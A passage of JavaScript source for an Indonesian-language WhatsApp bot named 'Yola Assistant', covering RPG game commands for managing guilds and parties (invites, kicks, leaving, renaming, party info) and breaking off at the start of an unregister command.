                await reply(`────୨ Yola Assistant ৎ────\n✅ Oke! @${targetJid.split('@')[0]} (ID: ${registeredUsers[targetJid].rpgId}) udah Yola terima jadi anggota Guild *${guild.name}*! Selamat datang yaa~\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetJid]
                });
                await yola.sendMessage(targetJid, `────୨ Yola Assistant ৎ────\n🎉 Yeay! Permintaan Kakak buat gabung sama Guild *${guild.name}* diterima! Selamat yaa~\n────୨ Yola Assistant ৎ────`);
            }
            break;

            case 'rejectguild':
            case 'handle_guild_reject_req': {
                const targetIdentifier = command === 'rejectguild' ? args[0] : body.split('_')[3];
                if (!targetIdentifier) return reply(`────୨ Yola Assistant ৎ────\n❓ Mau nolak permintaan dari siapa nih, Leader? Masukin ID Petualangnya yaa.\n contoh: ${prefix}rejectguild 123\n────୨ Yola Assistant ৎ────`);
                const targetJid = command === 'rejectguild' ? findUserJid(targetIdentifier, m) : targetIdentifier;

                 if (!targetJid) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Pengguna dengan ID/input "${targetIdentifier}" gak Yola temuin.\n────୨ Yola Assistant ৎ────`);
                if (!registeredUsers[targetJid]?.rpg) return reply(`────୨ Yola Assistant ৎ────\n❌ Pengguna @${targetJid.split('@')[0]} belum terdaftar petualang, Leader.\n────୨ Yola Assistant ৎ────`, { mentionedJid: [targetJid] });


                if (!userRPG.guildId) return reply("────୨ Yola Assistant ৎ────\n🛡️ Leader kan gak gabung di Guild mana-mana...\n────୨ Yola Assistant ৎ────");
                const guild = guilds[userRPG.guildId];
                if (!guild || guild.leader !== m.sender) return reply("────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Leader Guild yang boleh nolak permintaan.\n────୨ Yola Assistant ৎ────");

                const requestIndex = guild.requests.indexOf(targetJid);
                if (requestIndex === -1) return reply(`────୨ Yola Assistant ৎ────\n❌ Petualang @${targetJid.split('@')[0]} lagi gak minta gabung kok, Leader.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetJid]
                });

                guild.requests.splice(requestIndex, 1);
                saveGuilds();

                await reply(`────୨ Yola Assistant ৎ────\n❌ Oke. Permintaan gabung dari @${targetJid.split('@')[0]} (ID: ${registeredUsers[targetJid].rpgId}) udah Yola tolak ya, Leader.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetJid]
                });
                await yola.sendMessage(targetJid, `────୨ Yola Assistant ৎ────\n💔 Aduh, maaf yaa... Permintaan Kakak buat gabung sama Guild *${guild.name}* ditolak sama Leadernya.\n────୨ Yola Assistant ৎ────`);
            }
            break;

            case 'leaveguild': {
                if (!userRPG.guildId) return reply("────୨ Yola Assistant ৎ────\n🛡️ Kakak kan gak gabung di Guild mana-mana...\n────୨ Yola Assistant ৎ────");
                const guildId = userRPG.guildId;
                const guild = guilds[guildId];
                if (!guild) {
                    userRPG.guildId = null;
                    saveUsers(m.sender);
                    return reply("────୨ Yola Assistant ৎ────\n❌ Aduh, data Guildnya gak ketemu nih... Status Guild Kakak Yola reset ya.\n────୨ Yola Assistant ৎ────");
                }

                if (guild.leader === m.sender && guild.members.length > 1) {
                    return reply("────୨ Yola Assistant ৎ────\n❌ Hmph! Leader gak bisa keluar gitu aja kalo masih ada anggota lain. Pindahin kepemimpinan atau keluarin semua anggota dulu yaa, Kak.\n────୨ Yola Assistant ৎ────");
                }

                userRPG.guildId = null;
                guild.members = guild.members.filter(jid => jid !== m.sender);
                saveUsers(m.sender);

                if (guild.members.length === 0) {
                    delete guilds[guildId];
                    await reply(`────୨ Yola Assistant ৎ────\n💔 Kakak udah keluar dari Guild *${guild.name}*. Guildnya jadi bubar deh soalnya kosong...\n────୨ Yola Assistant ৎ────`).catch(e => {});
                } else {
                    if (guild.leader === m.sender) {
                         // Should not happen if length > 1 check works, but as fallback
                         guild.leader = pickRandom(guild.members);
                         await reply(`────୨ Yola Assistant ৎ────\n💔 Kakak udah keluar dari party. Kepemimpinan party-nya diserahin ke @${guild.leader.split('@')[0]}.\n────୨ Yola Assistant ৎ────`, { mentions: [guild.leader] }).catch(e => {});

                    } else {
                        await reply(`────୨ Yola Assistant ৎ────\n💔 Kakak udah keluar dari Guild *${guild.name}*.\n────୨ Yola Assistant ৎ────`).catch(e => {});
                         guild.members.forEach(memberJid => yola.sendMessage(memberJid, `────୨ Yola Assistant ৎ────\n👋 Guys, @${m.sender.split('@')[0]} udah keluar dari guild kita nih.\n────୨ Yola Assistant ৎ────`, { mentions: [m.sender] }).catch(e => {}));
                    }
                }
                saveGuilds();
            }
            break;

            case 'kickguild': {
                if (!userRPG.guildId) return reply("────୨ Yola Assistant ৎ────\n🛡️ Kakak kan gak gabung di Guild mana-mana...\n────୨ Yola Assistant ৎ────");
                const guild = guilds[userRPG.guildId];
                if (!guild || guild.leader !== m.sender) return reply("────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Leader Guild yang boleh ngeluarin anggota.\n────୨ Yola Assistant ৎ────");
                if (!q) return reply(`────୨ Yola Assistant ৎ────\n❓ Siapa nih yang mau dikeluarin, Leader? Masukin ID Petualangnya yaa.\nContoh: ${prefix}kickguild 123\n────୨ Yola Assistant ৎ────`);
                const targetId = parseInt(q);
                if (isNaN(targetId)) return reply("────୨ Yola Assistant ৎ────\n❌ ID Petualangnya gak valid nih, Leader.\n────୨ Yola Assistant ৎ────");
                const targetJid = findUserByRPGID(targetId);
                if (!targetJid) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Petualang dengan ID ${targetId} gak Yola temuin.\n────୨ Yola Assistant ৎ────`);
                if (targetJid === m.sender) return reply("────୨ Yola Assistant ৎ────\n❌ Masa mau ngeluarin diri sendiri, Leader? Ehehe\n────୨ Yola Assistant ৎ────");
                if (!guild.members.includes(targetJid)) return reply(`────୨ Yola Assistant ৎ────\n❌ Petualang @${targetJid.split('@')[0]} (ID: ${targetId}) bukan anggota Guild Kakak kok, Leader.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetJid]
                });

                guild.members = guild.members.filter(jid => jid !== targetJid);
                if (registeredUsers[targetJid]?.rpg) {
                    registeredUsers[targetJid].rpg.guildId = null;
                    saveUsers(targetJid);
                }
                saveGuilds();

                await reply(`────୨ Yola Assistant ৎ────\n👢 Oke! @${targetJid.split('@')[0]} (ID: ${targetId}) udah Yola keluarin dari Guild *${guild.name}*.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetJid]
                });
                await yola.sendMessage(targetJid, `────୨ Yola Assistant ৎ────\n👢 Aduh, maaf yaa... Kakak dikeluarin dari Guild *${guild.name}* sama Leadernya.\n────୨ Yola Assistant ৎ────`);
            }
            break;

            case 'createparty': {
                if (userRPG.partyId) return reply(`────୨ Yola Assistant ৎ────\n👨‍👩‍👧‍👦 Kakak udah punya Party kok!\n────୨ Yola Assistant ৎ────`);
                if (userRPG.pendingAction || userRPG.currentAction) return reply(`────୨ Yola Assistant ৎ────\n⏳ Kakak lagi ada kerjaan lain atau lagi siap-siap mau ngapain gitu. Selesain/batalin dulu yaa!\n────୨ Yola Assistant ৎ────`);
                if ((userRPG.currency.gold || 0) < PARTY_CREATE_COST) return reply(`────୨ Yola Assistant ৎ────\n❌ Aduh, Emas Kakak (${userRPG.currency.gold || 0}) gak cukup nih buat bikin Party (Perlu ${PARTY_CREATE_COST} 🪙).\n────୨ Yola Assistant ৎ────`);

                let partyName = args.join(' ');
                if (!partyName) {
                    partyName = `${pushname}'s Party`;
                }

                userRPG.currency.gold -= PARTY_CREATE_COST;
                rpgCounter.lastPartyId++;
                const newPartyId = `party_${rpgCounter.lastPartyId}`;
                const newParty = {
                    id: newPartyId,
                    name: partyName,
                    leader: m.sender,
                    members: [m.sender],
                    points: 0,
                    currentDungeon: null,
                    currentQuest: null,
                    createdAt: Date.now()
                };
                parties[newPartyId] = newParty;
                userRPG.partyId = newPartyId;

                saveParties();
                saveUsers(m.sender);
                saveRpgCounter();

                await reply(`────୨ Yola Assistant ৎ────\n👨‍👩‍👧‍👦 Yeay! Party *${partyName}* (ID: ${newPartyId.split('_')[1]}) berhasil dibikin! Kakak jadi Leadernya! Selamat yaa~\n-${PARTY_CREATE_COST} 🪙 Emas.\n────୨ Yola Assistant ৎ────`);
            }
            break;
            case 'changepartyname': {
                if (!userRPG.partyId) return reply(`────୨ Yola Assistant ৎ────\n❌ Kakak gak punya party nih buat diganti namanya.\n────୨ Yola Assistant ৎ────`);
                const party = parties[userRPG.partyId];
                if (!party || party.leader !== m.sender) return reply(`────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Leader Party yang bisa ganti nama party.\n────୨ Yola Assistant ৎ────`);
                if (!text || text.length < 3 || text.length > 25) return reply(`────୨ Yola Assistant ৎ────\n❓ Nama party barunya mau apa nih, Kak? Harus 3-25 karakter yaa.\n────୨ Yola Assistant ৎ────`);

                const newPartyName = text;
                const changeCost = 500;
                if ((userRPG.currency.gold || 0) < changeCost) return reply(`────୨ Yola Assistant ৎ────\n❌ Aduh, Emas Kakak (${userRPG.currency.gold || 0}) gak cukup nih buat ganti nama party (Perlu ${changeCost} 🪙).\n────୨ Yola Assistant ৎ────`);

                const confirmId = `changepartyname_confirm_${userRPG.partyId}_${newPartyName.replace(/\s/g, '_')}`;
                const cancelId = `changepartyname_cancel_${userRPG.partyId}`;

                let confirmText = `────୨ Yola Assistant ৎ────\n⚠️ *Konfirmasi Ganti Nama Party* ⚠️\n\nKakak yakin mau ganti nama party dari *${party.name}* jadi *${newPartyName}* dengan biaya *${changeCost} 🪙 Emas*?\n────୨ Yola Assistant ৎ────`;

                if (currentMenuStyle === 'V1') {
                    let buttons = [{
                        buttonId: confirmId,
                        buttonText: { displayText: '✅ Konfirmasi' },
                        type: 1
                    }, {
                        buttonId: cancelId,
                        buttonText: { displayText: '❌ Batal' },
                        type: 1
                    }];
                    let buttonMessage = {
                        text: confirmText,
                        footer: 'Pikirin baik-baik yaa, Kak!',
                        buttons: buttons,
                        headerType: 1,
                        contextInfo: defaultContextInfoBuilder(pushname, command)
                    };
                    await yola.sendMessage(m.chat, buttonMessage, { quoted: m });
                } else {
                    await reply(`${confirmText}\n\nKetik:\n • \`${prefix}handle_changepartyname_confirm ${userRPG.partyId} ${newPartyName.replace(/\s/g, '_')}\` (untuk konfirmasi)\n • \`${prefix}handle_changepartyname_cancel ${userRPG.partyId}\` (untuk batal)\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;
            case 'handle_changepartyname_confirm': {
                const parts = body.split('_');
                const partyId = `${parts[3]}_${parts[4]}`; // party_ID
                const newNameEncoded = parts.slice(5).join('_');
                const newPartyName = decodeURIComponent(newNameEncoded);

                if (!userRPG.partyId || userRPG.partyId !== partyId) return reply(`────୨ Yola Assistant ৎ────\nIni bukan tombol/perintah konfirmasi Kakak.\n────୨ Yola Assistant ৎ────`);
                const party = parties[partyId];
                if (!party || party.leader !== m.sender) return reply(`────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Leader Party yang bisa ganti nama party.\n────୨ Yola Assistant ৎ────`);

                const changeCost = 500;
                if ((userRPG.currency.gold || 0) < changeCost) return reply(`────୨ Yola Assistant ৎ────\n❌ Aduh, Emas Kakak (${userRPG.currency.gold || 0}) gak cukup nih buat ganti nama party (Perlu ${changeCost} 🪙).\n────୨ Yola Assistant ৎ────`);

                userRPG.currency.gold -= changeCost;
                party.name = newPartyName;
                saveUsers(m.sender);
                saveParties();

                await reply(`────୨ Yola Assistant ৎ────\n✅ Yeay! Nama party Kakak berhasil diganti jadi *${newPartyName}*! -${changeCost} 🪙 Emas.\n────୨ Yola Assistant ৎ────`);
                party.members.forEach(memberJid => {
                    if (memberJid !== m.sender) {
                        yola.sendMessage(memberJid, `────୨ Yola Assistant ৎ────\n🎉 Info Party: Nama party kita sekarang *${newPartyName}*! Keren kan? (>_<) \n────୨ Yola Assistant ৎ────`);
                    }
                });
            }
            break;
            case 'handle_changepartyname_cancel': {
                if (!userRPG.partyId) return reply(`────୨ Yola Assistant ৎ────\nIni bukan tombol/perintah Kakak.\n────୨ Yola Assistant ৎ────`);
                reply(`────୨ Yola Assistant ৎ────\n👍 Oke! Penggantian nama party dibatalkan.\n────୨ Yola Assistant ৎ────`);
            }
            break;

            case 'inviteparty': {
                if (!userRPG.partyId) return reply(`────୨ Yola Assistant ৎ────\n❌ Kakak gak punya party nih buat ngundang orang.\n────୨ Yola Assistant ৎ────`);
                const party = parties[userRPG.partyId];
                if (!party || party.leader !== m.sender) return reply("────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Leader Party yang boleh ngundang.\n────୨ Yola Assistant ৎ────");
                if (party.members.length >= PARTY_MAX_MEMBERS) return reply(`────୨ Yola Assistant ৎ────\n❌ Aduh, Party-nya udah penuh nih (${party.members.length}/${PARTY_MAX_MEMBERS}).\n────୨ Yola Assistant ৎ────`);
                if (!q) return reply(`────୨ Yola Assistant ৎ────\n❓ Mau ngundang siapa nih, Kak? Pakai ID Petualang target yaa.\nExample: ${prefix}inviteparty 123\n────୨ Yola Assistant ৎ────`);
                const targetId = parseInt(q);
                if (isNaN(targetId)) return reply("────୨ Yola Assistant ৎ────\n❌ ID Petualangnya gak valid nih, Kak.\n────୨ Yola Assistant ৎ────");

                const targetJid = findUserByRPGID(targetId);
                if (!targetJid || !registeredUsers[targetJid]?.rpg) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Petualang dengan ID ${targetId} gak Yola temuin.\n────୨ Yola Assistant ৎ────`);
                if (targetJid === m.sender) return reply("────୨ Yola Assistant ৎ────\n❌ Masa mau ngundang diri sendiri, Kak? Ehehe\n────୨ Yola Assistant ৎ────");
                if (party.members.includes(targetJid)) return reply(`────୨ Yola Assistant ৎ────\n✅ @${targetJid.split('@')[0]} udah ada di party Kakak kok.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetJid]
                });
                if (registeredUsers[targetJid].rpg.partyId) return reply(`────୨ Yola Assistant ৎ────\n❌ Petualang @${targetJid.split('@')[0]} udah punya party lain, Kak.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetJid]
                });
                if (registeredUsers[targetJid].rpg.pendingAction || registeredUsers[targetJid].rpg.currentAction) {
                    return reply(`────୨ Yola Assistant ৎ────\n❌ Aduh, @${targetJid.split('@')[0]} lagi sibuk atau lagi siap-siap mau ngapain gitu...\n────୨ Yola Assistant ৎ────`, {
                        mentions: [targetJid]
                    });
                }
                if (partyInvites[targetJid]) {
                    return reply(`────୨ Yola Assistant ৎ────\n⏳ Petualang @${targetJid.split('@')[0]} udah dapet undangan party lain yang masih nunggu jawaban nih, Kak.\n────୨ Yola Assistant ৎ────`, {
                        mentions: [targetJid]
                    });
                }

                partyInvites[targetJid] = {
                    partyId: userRPG.partyId,
                    inviter: m.sender,
                    timestamp: Date.now()
                };
                savePartyInvites();

                const senderName = registeredUsers[m.sender].name;
                const partyId = userRPG.partyId;

                let inviteMessageText = `────୨ Yola Assistant ৎ────\n💌 Ada Undangan Party nih buat Kakak! 💌\n\n*${senderName}* ngajakin Kakak buat gabung ke party-nya (ID: ${partyId.split('_')[1]}).\n\nMau gabung gak?\n────୨ Yola Assistant ৎ────`;
                let messageOptions = {
                    text: inviteMessageText,
                    footer: 'Pilih jawabanmu yaa~ ❤️',
                    contextInfo: {
                        mentionedJid: [m.sender, targetJid],
                        ...defaultContextInfoBuilder(pushname, command)
                    }
                };

                if (currentMenuStyle === 'V1') {
                    messageOptions.buttons = [{
                        buttonId: `handle_party_accept_${m.sender}`,
                        buttonText: {
                            displayText: '✅ Terima Undangannya!'
                        },
                        type: 1
                    }, {
                        buttonId: `handle_party_reject_${m.sender}`,
                        buttonText: {
                            displayText: '❌ Maaf, Gak Bisa'
                        },
                        type: 1
                    }];
                    messageOptions.headerType = 1;
                } else {
                    await reply(`${inviteMessageText}\n\nKetik:\n • \`${prefix}acceptparty ${registeredUsers[m.sender].rpgId}\` (untuk terima)\n • \`${prefix}rejectparty ${registeredUsers[m.sender].rpgId}\` (untuk tolak)`);
                }

                 await yola.sendMessage(targetJid, messageOptions);

                await reply(`────୨ Yola Assistant ৎ────\n✅ Oke! Undangan party buat @${targetJid.split('@')[0]} (ID: ${targetId}) udah Yola kirim! Semoga diterima yaa~ >_<\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetJid]
                });

            }
            break;

            case 'acceptparty':
            case 'handle_party_accept': {
                if (!isRegistered) return reply(`────୨ Yola Assistant ৎ────\n⚔️ Kakak belum terdaftar nih! Yuk daftar dulu pakai *${prefix}daftar nama.umur*\n────୨ Yola Assistant ৎ────`);

                const inviterIdentifier = command === 'acceptparty' ? args[0] : body.split('_')[3];
                if (!inviterIdentifier) return reply(`────୨ Yola Assistant ৎ────\n❓ Mau nerima undangan dari siapa nih, Kak? Pakai ID Petualangnya atau pastiin ini respons tombol yang bener yaa.\nContoh: ${prefix}acceptparty 123\n────୨ Yola Assistant ৎ────`);

                const inviterJid = command === 'acceptparty' ? findUserJid(inviterIdentifier, m) : inviterIdentifier;

                if (!inviterJid || !registeredUsers[inviterJid]?.rpg) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Pengundang dengan ID/input "${inviterIdentifier}" gak Yola temuin atau belum terdaftar.\n────୨ Yola Assistant ৎ────`);

                const inviteData = partyInvites[m.sender];
                if (!inviteData || inviteData.inviter !== inviterJid) return reply(`────୨ Yola Assistant ৎ────\n❌ Gak ada undangan aktif dari @${inviterJid.split('@')[0]} buat Kakak.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [inviterJid]
                });
                if (userRPG.partyId) return reply("────୨ Yola Assistant ৎ────\n❌ Kakak udah punya party kok.\n────୨ Yola Assistant ৎ────");
                if (userRPG.pendingAction || userRPG.currentAction) return reply(`────୨ Yola Assistant ৎ────\n⏳ Kakak lagi ada kerjaan lain atau lagi siap-siap mau ngapain gitu. Selesain/batalin dulu yaa!\n────୨ Yola Assistant ৎ────`);

                const partyId = inviteData.partyId;
                const party = parties[partyId];
                if (!party) {
                    delete partyInvites[m.sender];
                    savePartyInvites();
                    return reply("────୨ Yola Assistant ৎ────\n❌ Aduh, Party-nya udah gak ada...\n────୨ Yola Assistant ৎ────");
                }
                if (party.members.length >= PARTY_MAX_MEMBERS) {
                    delete partyInvites[m.sender];
                    savePartyInvites();
                    return reply(`────୨ Yola Assistant ৎ────\n❌ Aduh, Party *${partyId.split('_')[1]}* udah penuh nih.\n────୨ Yola Assistant ৎ────`);
                }

                userRPG.partyId = partyId;
                party.members.push(m.sender);
                party.points = (party.points || 0) + 5;
                delete partyInvites[m.sender];

                saveUsers(m.sender);
                saveParties();
                savePartyInvites();

                await reply(`────୨ Yola Assistant ৎ────\n✅ Yeay! Kakak berhasil gabung sama party (ID: ${partyId.split('_')[1]})! Seru!\n────୨ Yola Assistant ৎ────`);
                party.members.forEach(memberJid => {
                    if (memberJid !== m.sender) {
                        yola.sendMessage(memberJid, `────୨ Yola Assistant ৎ────\n🎉 Hore! @${m.sender.split('@')[0]} udah gabung sama party kita!\n────୨ Yola Assistant ৎ────`, {
                            mentions: [m.sender]
                        });
                    }
                });
            }
            break;

            case 'rejectparty':
            case 'handle_party_reject': {
                if (!isRegistered) return reply(`────୨ Yola Assistant ৎ────\n⚔️ Kakak belum terdaftar nih! Yuk daftar dulu pakai *${prefix}daftar nama.umur*\n────୨ Yola Assistant ৎ────`);

                const inviterIdentifier = command === 'rejectparty' ? args[0] : body.split('_')[3];
                if (!inviterIdentifier) return reply(`────୨ Yola Assistant ৎ────\n❌ Aduh, data penolakannya gak valid nih...\n────୨ Yola Assistant ৎ────`);

                const inviterJid = command === 'rejectparty' ? findUserJid(inviterIdentifier, m) : inviterIdentifier;

                if (!inviterJid || !registeredUsers[inviterJid]?.rpg) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Pengundang dengan ID/input "${inviterIdentifier}" gak Yola temuin atau belum terdaftar.\n────୨ Yola Assistant ৎ────`);


                const inviteData = partyInvites[m.sender];
                if (!inviteData || inviteData.inviter !== inviterJid) return reply("────୨ Yola Assistant ৎ────\n❌ Gak ada undangan aktif dari pengguna itu buat ditolak.\n────୨ Yola Assistant ৎ────");

                delete partyInvites[m.sender];
                savePartyInvites();

                await reply(`────୨ Yola Assistant ৎ────\n💔 Oke. Kakak nolak undangan party dari @${inviterJid.split('@')[0]}.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [inviterJid]
                });
                await yola.sendMessage(inviterJid, {
                    text: `────୨ Yola Assistant ৎ────\n💔 Aduh, undangan party Kakak buat @${m.sender.split('@')[0]} ditolak nih...\n────୨ Yola Assistant ৎ────`,
                    contextInfo: {
                        mentionedJid: [m.sender]
                    }
                });
            }
            break;

            case 'leaveparty': {
                if (!userRPG.partyId) return reply("────୨ Yola Assistant ৎ────\n❌ Kakak kan gak punya party...\n────୨ Yola Assistant ৎ────");
                if (userRPG.pendingAction?.type.startsWith('dungeon_party') || userRPG.currentAction?.type.startsWith('dungeon_party') || userRPG.pendingAction?.type.startsWith('quest_party') || userRPG.currentAction?.type.startsWith('quest_party')) {
                    return reply("────୨ Yola Assistant ৎ────\n❌ Kakak gak bisa keluar party pas lagi siap-siap atau di dalem dungeon/quest party yaa.\n────୨ Yola Assistant ৎ────");
                }

                const partyId = userRPG.partyId;
                const party = parties[partyId];
                if (!party) {
                    userRPG.partyId = null;
                    saveUsers(m.sender);
                    return reply("────୨ Yola Assistant ৎ────\n❌ Aduh, data party-nya gak ketemu nih... Status party Kakak Yola reset ya.\n────୨ Yola Assistant ৎ────");
                }

                userRPG.partyId = null;
                party.members = party.members.filter(jid => jid !== m.sender);
                saveUsers(m.sender);

                if (party.members.length === 0) {
                    delete parties[partyId];
                    await reply("────୨ Yola Assistant ৎ────\n💔 Kakak udah keluar dari party. Party-nya jadi bubar deh soalnya kosong...\n────୨ Yola Assistant ৎ────").catch(e => {});
                } else {
                    if (party.leader === m.sender) {
                         party.leader = pickRandom(party.members);
                         await reply(`────୨ Yola Assistant ৎ────\n💔 Kakak udah keluar dari party. Kepemimpinan party-nya diserahin ke @${party.leader.split('@')[0]}.\n────୨ Yola Assistant ৎ────`, { mentions: [party.leader] }).catch(e => {});
                         party.members.forEach(memberJid => yola.sendMessage(memberJid, `────୨ Yola Assistant ৎ────\nℹ️ Info nih, guys: Leader @${m.sender.split('@')[0]} udah keluar. Leader baru kita sekarang @${party.leader.split('@')[0]}!\n────୨ Yola Assistant ৎ────`, { mentions: [m.sender, party.leader] }).catch(e => {}));
                    } else {
                        await reply("────୨ Yola Assistant ৎ────\n💔 Kakak udah keluar dari party.\n────୨ Yola Assistant ৎ────").catch(e => {});
                         party.members.forEach(memberJid => yola.sendMessage(memberJid, `────୨ Yola Assistant ৎ────\n👋 Guys, @${m.sender.split('@')[0]} udah keluar dari party kita nih.\n────୨ Yola Assistant ৎ────`, { mentions: [m.sender] }).catch(e => {}));
                    }
                }
                saveParties();
            }
            break;

            case 'kickparty': {
                if (!userRPG.partyId) return reply("────୨ Yola Assistant ৎ────\n❌ Kakak kan gak punya party...\n────୨ Yola Assistant ৎ────");
                const party = parties[userRPG.partyId];
                if (!party || party.leader !== m.sender) return reply("────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Leader Party yang boleh ngeluarin anggota.\n────୨ Yola Assistant ৎ────");
                if (!q) return reply(`────୨ Yola Assistant ৎ────\n❓ Siapa nih yang mau dikeluarin, Leader? Masukin ID Petualangnya yaa.\nContoh: ${prefix}kickparty 123\n────୨ Yola Assistant ৎ────`);
                const targetId = parseInt(q);
                if (isNaN(targetId)) return reply("────୨ Yola Assistant ৎ────\n❌ ID Petualangnya gak valid nih, Leader.\n────୨ Yola Assistant ৎ────");
                const targetJid = findUserByRPGID(targetId);
                if (!targetJid) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Petualang dengan ID ${targetId} gak Yola temuin.\n────୨ Yola Assistant ৎ────`);
                if (targetJid === m.sender) return reply("────୨ Yola Assistant ৎ────\n❌ Masa mau ngeluarin diri sendiri, Leader? Ehehe\n────୨ Yola Assistant ৎ────");
                if (!party.members.includes(targetJid)) return reply(`────୨ Yola Assistant ৎ────\n❌ Petualang @${targetJid.split('@')[0]} (ID: ${targetId}) bukan anggota party Kakak kok, Leader.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetJid]
                });
                if (registeredUsers[targetJid]?.rpg?.pendingAction?.type.startsWith('dungeon_party') || registeredUsers[targetJid]?.rpg?.currentAction?.type.startsWith('dungeon_party') || registeredUsers[targetJid]?.rpg?.pendingAction?.type.startsWith('quest_party') || registeredUsers[targetJid]?.rpg?.currentAction?.type.startsWith('quest_party')) {
                    return reply(`────୨ Yola Assistant ৎ────\n❌ Gak bisa ngeluarin @${targetJid.split('@')[0]} pas lagi siap-siap atau di dalem dungeon/quest party ya, Leader.\n────୨ Yola Assistant ৎ────`, {
                        mentions: [targetJid]
                    });
                }


                party.members = party.members.filter(jid => jid !== targetJid);
                if (registeredUsers[targetJid]?.rpg) {
                    registeredUsers[targetJid].rpg.partyId = null;
                    saveUsers(targetJid);
                }
                saveParties();

                await reply(`────୨ Yola Assistant ৎ────\n👢 Oke! @${targetJid.split('@')[0]} (ID: ${targetId}) udah Yola keluarin dari party.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetJid]
                });
                await yola.sendMessage(targetJid, `────୨ Yola Assistant ৎ────\n👢 Aduh, maaf yaa... Kakak dikeluarin dari party sama Leadernya.\n────୨ Yola Assistant ৎ────`);
            }
            break;

            case 'partyinfo': {
                if (!userRPG.partyId) return reply("────୨ Yola Assistant ৎ────\n❌ Kakak kan gak punya party...\n────୨ Yola Assistant ৎ────");
                const party = parties[userRPG.partyId];
                if (!party) {
                    userRPG.partyId = null;
                    saveUsers(m.sender);
                    return reply("────୨ Yola Assistant ৎ────\n❌ Aduh, data party-nya gak ketemu nih... Status party Kakak Yola reset ya.\n────୨ Yola Assistant ৎ────");
                }

                const leaderData = registeredUsers[party.leader];
                const leaderName = leaderData?.name || `@${party.leader.split('@')[0]}`;
                let memberList = party.members.map(jid => {
                    const memberData = registeredUsers[jid];
                    return `│✧  - ${memberData?.name || `@${jid.split('@')[0]}`} (ID: ${memberData?.rpgId || '?'}) ${jid === party.leader ? '👑' : ''}`;
                }).join('\n');

                let partyInfoText = `┌── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮\n│✧ *Informasi Party (${party.name || `ID: ${party.id.split('_')[1]}`})* 👨‍👩‍👧‍👦\n│✧\n│✧ *Leader:* ${leaderName}\n│✧ *Anggota (${party.members.length}/${PARTY_MAX_MEMBERS}):*\n${memberList}\n│✧\n│✧ *Poin Party:* ${party.points || 0}\n│✧ *Dibuat:* ${new Date(party.createdAt).toLocaleDateString('id-ID')}`;
                if (party.currentDungeon) {
                    partyInfoText += `\n│✧ ⚔️ *Status:* Lagi di Dungeon ${rpgDungeons.find(d => d.id === party.currentDungeon.id)?.name || party.currentDungeon.id}`;
                } else if (party.members.some(jid => registeredUsers[jid]?.rpg?.pendingAction?.type === 'dungeon_party_pending')) {
                    const pendingDungeonId = registeredUsers[party.leader]?.rpg?.pendingAction?.dungeonId;
                    if (pendingDungeonId) {
                        partyInfoText += `\n│✧ ⏳ *Status:* Lagi siap-siap masuk Dungeon ${rpgDungeons.find(d => d.id === pendingDungeonId)?.name || pendingDungeonId}`;
                    }
                } else if (party.currentQuest) {
                    partyInfoText += `\n│✧ 📜 *Status:* Lagi di Quest ${rpgQuests[party.currentQuest.id]?.name || party.currentQuest.id}`;
                } else if (party.members.some(jid => registeredUsers[jid]?.rpg?.pendingAction?.type === 'quest_pending' && rpgQuests[registeredUsers[jid]?.rpg?.pendingAction?.questId]?.isPartyOnlyQuest)) {
                     const pendingQuestId = registeredUsers[party.leader]?.rpg?.pendingAction?.questId;
                     if (pendingQuestId) {
                         partyInfoText += `\n│✧ ⏳ *Status:* Lagi siap-siap mulai Quest Party ${rpgQuests[pendingQuestId]?.name || pendingQuestId}`;
                     }
                }

                partyInfoText += `\n╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;
                await reply(`${partyInfoText}`, {
                    mentions: [party.leader, ...party.members]
                });
            }
            break;
                        case 'unreg': {
                let targetJid = m.sender;
                let targetId = userRPG?.rpgId;
                let actionArg = args[0]?.toLowerCase(); // 'c' atau 'd'
                let targetIdFromArg = null;

                if (args.length >= 1) {
                    if (args.length === 1 && (actionArg === 'c' || actionArg === 'd')) {
                        // Action for self: .unreg c or .unreg d
                        // targetJid remains m.sender, targetId remains userRPG.rpgId
                    } else {
                        // Attempt to parse target ID from first arg, and action from second
                        const firstArgParsed = parseInt(args[0]);
                        if (!isNaN(firstArgParsed)) {
                            targetIdFromArg = firstArgParsed;
                            targetJid = findUserByRPGID(targetIdFromArg);
                            targetId = targetIdFromArg; // Update targetId for the message
                            actionArg = args[1]?.toLowerCase();
                        } else {
                            // If first arg is not a number, it's a full argument like 'c' or 'd' for self
                            // This means target is m.sender, actionArg is what it already is
                        }
                    }
                }

                if (!isRegistered && targetJid === m.sender) return reply("────୨ Yola Assistant ৎ────\n🛡️ Kakak kan belum terdaftar...\n────୨ Yola Assistant ৎ────");
                if (targetJid && !registeredUsers[targetJid]?.rpg) {
                     return reply(`────୨ Yola Assistant ৎ────\n🛡️ Akun @${targetJid.split('@')[0]} tidak terdaftar sebagai petualang.\n────୨ Yola Assistant ৎ────`, { mentions: [targetJid] });
                }

                // Check for owner permission if target is not self
                if (targetJid !== m.sender && !isOwner) {
                     return reply("────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Owner yang bisa unreg akun orang lain.\n────୨ Yola Assistant ৎ────");
                }

                const pendingUnregKey = `unreg_${targetJid}`;

